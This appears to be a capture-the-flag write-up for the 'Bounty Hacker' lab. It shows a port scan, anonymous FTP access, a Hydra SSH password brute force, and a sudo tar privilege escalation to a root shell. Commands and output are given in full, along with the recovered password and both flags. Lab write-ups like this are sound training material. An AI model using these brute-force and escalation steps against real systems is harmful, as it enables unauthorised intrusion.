# Bounty Hacker

![image.png](images/image.png)

## Port Scan

```bash
└─$ rustscan -a bountyhacker.thm --ulimit 5000 -- -A -oN nmap.log
...
Open xx.xx.xxx.xxx:21
Open xx.xx.xxx.xxx:22
Open xx.xx.xxx.xxx:80
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.178.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:55:5f:22:de:d5:3c:bc:d9:f5:ff:1b:9f:fe:02:f1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIx6CW4GbwEyV9Oq4QxfkK0sXnAqedsFRU5P2/V9J0+DibGOFPuGjdl3gJbjZg0fHVt8FiydX/b7CGQ6mFvImaXBl0M1EP/B7icqnmrvWdhY3YeWBFlVvSTHvoq0/oqISUFt5wuVHuQcf2WptvopAeAytDoVHnmfxy/SU+AlbAnagntOYj1VY6o4MHvhBLPRJLYnT5y6DUJlZUrzWEuUuSaEx/36l+g3uuAdH942weiaEJXKS9C862h4y7HoYNqdEjNrEtegt5RHgPYn/S5HDEtl0z2Y/sNPE1ZVnSyQuC8QfLiJ2GSqkwLwU4X7Z/X0Hp0EG+m/wimdKikf72DI/eXpq/jqTyRvLRXUe7thUdr79WdlEgF3I8891bkEF211yolHCWTbFpguY+a03BonPxdIggC4WnGhZy024/2zyePieLfx4EEUoVdiXx2pAEoVqT/JzcaZLLsO0rlz/i5nWBTBwFGrtQQ9r/lFuAE+Ga0zmOJAJSOiE/ZkF0yNBSRYM=
|   256 c6:0e:ac:fc:4b:1e:3e:ee:03:2a:07:47:3b:3e:dc:e4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTufG41og7VG0VL56lOwSz5qe+t2TneF/uwS3kfKpbvWpvZL5f56ATHCWb2V2rQWm6++6dxz7Xsh3EirF+uMsA=
|   256 1c:29:a6:99:73:84:95:7f:04:fd:c7:f5:c3:c1:42:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHyT6Apotx4aPprh8SPZebOkAqILXI9hJ3eVR1fg3zF3
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|phone|specialized
Running (JUST GUESSING): Linux 4.X|5.X|6.X (93%), HP embedded (89%), Google Android 10.X|11.X|12.X (89%), Crestron 2-Series (88%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/h:hp:p2000_g3 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:crestron:2_series
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.19 (93%), Linux 5.14 - 6.8 (92%), Linux 4.15 (91%), Linux 5.4 - 5.15 (91%), HP P2000 G3 NAS device (89%), Android 10 - 12 (Linux 4.14 - 4.19) (89%), Crestron XPanel control system (88%), Android 10 - 11 (Linux 4.9 - 4.14) (88%), Android 9 - 11 (Linux 4.9 - 4.14) (88%), Linux 2.6.32 (88%)
No exact OS matches for host (test conditions non-ideal).
```

There are 3 open ports, they are:

- Port 21: FTP (vsftpd 3.0.5)
- Port 22: SSH (OpenSSH 8.2p1)
- Port 80: HTTP (Apache httpd 2.4.41)

## FTP Anonymous Login

In the above Nmap scan, we already confirm that anonymous logins are allowed

```bash
└─$ ftp anonymous@bountyhacker.thm
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.5)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

```

Obtain both the `locks.txt` and `task.txt`.

The `task.txt` reveals the user `lin`.

```bash
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

And the `locks.txt` seems to be a password list

```bash
└─$ cat locks.txt 
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```

## HTTP Web Page

The main page display some dialogues and a picture from Cowboy Bebop, yet it reveals no useful information for us.

![image.png](images/image%201.png)

We can also try to do web enumeration, but nothing is interesting.

```bash
└─$ ffuf -u http://bountyhacker.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bountyhacker.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 127ms]
.hta                    [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 140ms]
                        [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 126ms]
.htaccess               [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 129ms]
images                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 105ms]
index.html              [Status: 200, Size: 969, Words: 135, Lines: 31, Duration: 105ms]
javascript              [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 103ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 101ms]
:: Progress: [4614/4614] :: Job [1/1] :: 380 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

## SSH Brute force

Since there is no CMS or login panel in port 80, all we can do is to brute force the `lin` user password on SSH.

```bash
└─$ hydra -l lin -P locks.txt ssh://bountyhacker.thm -Vv -f
...
[DATA] attacking ssh://bountyhacker.thm:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://lin@xx.xx.xxx.xxx:22
[INFO] Successful, password authentication is supported by ssh://xx.xx.xxx.xxx:22
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
[ATTEMPT] target bountyhacker.thm - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
...
[22][ssh] host: bountyhacker.thm   login: lin   password: RedDr4gonSynd1cat3
[STATUS] attack finished for bountyhacker.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-07 21:33:57
```

We found that the password is `RedDr4gonSynd1cat3`.

## Gain a Foothold

Now, we can login on SSH using `lin`’s credentials

```bash
└─$ ssh lin@bountyhacker.thm
...
lin@bountyhacker.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Aug 11 12:32:35 2025 from xx.xx.x.xxx
lin@ip-xx-xx-xxx-xxx:~/Desktop$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)
```

The `user.txt` is located in the home directory of `lin`

```bash
lin@ip-xx-xx-xxx-xxx:~/Desktop$ ls
user.txt
lin@ip-xx-xx-xxx-xxx:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

User Flag: `THM{CR1M3_SyNd1C4T3}` 

## Privilege Escalation

We can use `sudo -l` to check our `sudo` privileges.

```bash
lin@ip-xx-xx-xxx-xxx:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-xx-xx-xxx-xxx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-xx-xx-xxx-xxx:
    (root) /bin/tar
```

It seems we can execute `tar` with `sudo`, which we can [spawn a root shell]([https://gtfobins.org/gtfobins/tar/](https://gtfobins.org/gtfobins/tar/))

```bash
lin@ip-xx-xx-xxx-xxx:~/Desktop$ sudo /bin/tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
/bin/tar: Removing leading `/' from member names
root@ip-xx-xx-xxx-xxx:/home/lin/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```

Now get the root flag

```bash
root@ip-xx-xx-xxx-xxx:/home/lin/Desktop# cd /root
root@ip-xx-xx-xxx-xxx:~# ls
root.txt  snap
root@ip-xx-xx-xxx-xxx:~# cat root.txt
THM{80UN7Y_h4cK3r}
```

Root Flag: `THM{80UN7Y_h4cK3r}`
